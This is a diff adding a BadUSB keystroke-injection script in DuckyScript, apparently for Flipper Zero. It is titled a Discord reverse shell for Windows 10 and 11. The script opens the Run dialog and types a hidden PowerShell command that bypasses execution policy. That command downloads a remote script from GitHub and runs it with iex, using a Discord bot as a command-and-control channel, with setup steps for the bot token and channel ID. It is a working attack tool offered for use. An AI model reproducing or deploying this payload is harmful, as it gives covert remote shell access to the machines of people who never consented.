@@ -1,0 +1,23 @@
+
+REM Title: beigeworm's Discord Reverse Shell.
+REM Author: @beigeworm
+REM Description: Using a Discord bot along with discords API to Act as a Powershell Terminal.
+REM Target: Windows 10 and 11
+
+REM SETUP
+REM make a discord bot at https://discord.com/developers/applications/
+REM add the bot to your discord server
+REM Change BOT_TOKEN below with your bot token
+REM Change CHANNEL_ID below to your channel id
+REM for more info goto - https://github.com/beigeworm/PoshCord-C2
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $ch = 'CHANNEL_ID'; $tk = 'BOT_TOKEN'; irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Discord-Reverse-Shell/main.ps1 | iex
+ENTER
+
